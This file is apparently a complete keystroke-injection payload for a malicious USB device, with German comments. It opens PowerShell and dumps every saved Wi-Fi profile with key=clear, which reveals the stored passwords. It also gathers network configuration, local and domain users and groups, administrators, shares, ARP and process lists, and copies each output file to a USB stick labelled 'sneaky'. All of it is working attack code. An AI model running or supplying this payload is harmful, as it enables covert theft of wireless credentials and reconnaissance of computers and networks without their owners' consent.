layout('de') //set layout de

delay(1000)
press("GUI r") //Windows + r
delay(500)
type("powershell\n") //Write Powershell + enter
delay(1000)

type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'sneaky'} | select name\n") //Herausfinden was der USB ist

type("$output = netsh wlan show profile | select-string -Pattern 'alle Benutzer' -AllMatches\n") //Die SSIDs Herausfinden
type("$output2 = ($output -split ':').Trim()\n")
type("$output3 = ($output2 -split 'Profil fÃ¼r alle Benutzer').Trim()\n")
type("$SSID = $output3.Split(';',[System.StringSplitOptions]::RemoveEmptyEntries)\n")

type("netsh wlan show profile > WlanProfile.txt\n") //wlan Profile
type("mv WlanProfile.txt $usbpath.name\n")

type("for ($i = 0; $i -le ($SSID.length -1); $i++) {netsh wlan show profile $SSID[$i] key=clear > $i'.txt'}\n") //Die SSIDs nutzen
type("for ($i = 0; $i -le ($SSID.length -1); $i++) {mv $i'.txt' $usbpath.name}\n") //Die SSIDs bewegen

type("ipconfig /all > Ipconfig.txt\n") //Ipconfig
type("mv Ipconfig.txt $usbpath.name\n")  

type("net user > netuser.txt\n") //Lokale User Abfragen
type("mv netuser.txt $usbpath.name\n")

type("net user /domain > netuserDOMAIN.txt\n") //Domain User Abfragen
type("mv netuserDOMAIN.txt $usbpath.name\n")

type("net localgroup > localgroup.txt\n") //Lokale Gruppen Abfragen
type("mv localgroup.txt $usbpath.name\n")

type("net localgroup /domain > localgroupDOMAIN.txt\n") //Domain Gruppen Abfragen
type("mv localgroupDOMAIN.txt $usbpath.name\n")

type("net localgroup Administratoren > Administratoren.txt\n") //Lokale Administratoren Abfragen
type("mv Administratoren.txt $usbpath.name\n")

type("net share > netShare.txt\n") //Partitionen Abfragen
type("mv netShare.txt $usbpath.name\n")

type("net view > netView.txt\n") //Net Viewe
type("mv netView.txt $usbpath.name\n")

type("arp -a > arp.txt\n") //GerÃ¤te im Netz
type("mv arp.txt $usbpath.name\n")

type("tasklist *> tasklist.txt\n") //Offene Anwendungen abfragen
type("mv tasklist.txt $usbpath.name\n")

type("netstat > netstat.txt\n") //TCP Verbindungen Abfragen
type("mv netstat.txt $usbpath.name\n")

delay(2000)
type("exit\n") //exit